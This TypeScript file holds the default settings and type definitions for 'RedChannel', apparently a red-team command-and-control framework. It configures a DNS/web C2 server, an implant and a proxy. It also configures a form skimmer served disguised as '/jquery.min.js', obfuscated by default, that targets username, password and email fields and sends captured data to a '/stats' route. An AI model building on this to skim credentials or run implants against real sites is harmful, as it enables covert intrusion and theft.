import * as crypto from "crypto";

export const DefaultConfig: RedChannelConfig = {
    c2: {
        domain: "c2.redchannel.tld",
        dns_ip: "127.0.0.1",
        dns_port: 53,
        web_ip: "127.0.0.1",
        web_port: 80,
        ts_ip: "127.0.0.1",
        ts_port: 3000,
        binary_route: "/agent",
        debug: true,
        web_url: "",
    },
    proxy: {
        enabled: false,
        key: crypto.randomBytes(6).toString("hex"),
        interval: 2000,
        obfuscate_payload: false,
        url: "http://127.0.0.1/",
    },
    implant: {
        interval: 5000,
        resolver: "8.8.8.8:53",
        proxy_enabled: false,
        proxy_key: "redchannel",
        proxy_url: "",
        throttle_sendq: true,
        debug: false,
    },
    skimmer: {
        payload_route: "/jquery.min.js",
        data_route: "/stats",
        url: "",
        target_classes: [],
        target_ids: [],
        obfuscate_payload: true,
    },
    static_dns: new Map<StaticDnsHost, StaticDnsIp>(),
};

export interface C2Config {
    // the c2 domain, with authority to answer dns queries
    domain: string;
    // the bind ip of the dns server
    dns_ip: string;
    // the port of the dns server
    dns_port: number;

    // the bind ip of the web server
    web_ip: string;
    // the port of the web server
    web_port: number;
    // the route to serve the binary from on the web server
    // ie: /payload.exe - agent code will be available at http://[web_ip]:[web_port]/payload.exe
    binary_route: string;

    // the external url of the web server: http://c2.redchannel.tld
    // this will be the base of the binary_route
    web_url: string;

    // the bind ip of the teamserver
    ts_ip: string;
    // the port of the teamserver
    ts_port: number;

    // enable debug mode
    debug: boolean;
}

export interface SkimmerModuleConfig {
    // the route to serve the skimmer payload from on the c2 web server
    // ie: /jquery.min.js - skimmer code will be available at http://[skimmer.url]/jquery.min.js
    payload_route: string;
    // the route to accept incoming skimmer data
    // ie: /stats - skimmer will send data to http://[skimmer.url]/stats
    data_route: string;
    // the external url of the web server: http://c2.redchannel.tld -> [reverse proxy] -> http://[c2.web_ip]:[c2.web_port]/
    // this will be the base of the [payload_route] and [data_route]
    url: string;
    // the list of class names to help find elements to skim data
    // ["passwordField", "mt-4"]
    target_classes: string[];
    // the list of ids to help find elements to skim data from
    // ["username", "password", "email"]
    target_ids: string[];
    // should we obfuscate the skimmer payload
    obfuscate_payload: boolean;
}

export type StaticDnsHost = string;
export type StaticDnsIp = string;
export type StaticDnsModuleConfig = Map<StaticDnsHost, StaticDnsIp>;

export interface ProxyModuleConfig {
    enabled: boolean;
    url: string;
    key: string;
    interval: number;
    obfuscate_payload: boolean;
}

export interface ImplantModuleConfig {
    resolver: string;
    interval: number;
    debug: boolean;
    proxy_url: string;
    proxy_enabled: boolean;
    proxy_key: string;
    throttle_sendq: boolean;
}

export type RedChannelConfig = {
    c2: C2Config;
    skimmer: SkimmerModuleConfig;
    static_dns: StaticDnsModuleConfig;
    proxy: ProxyModuleConfig;
    implant: ImplantModuleConfig;
};
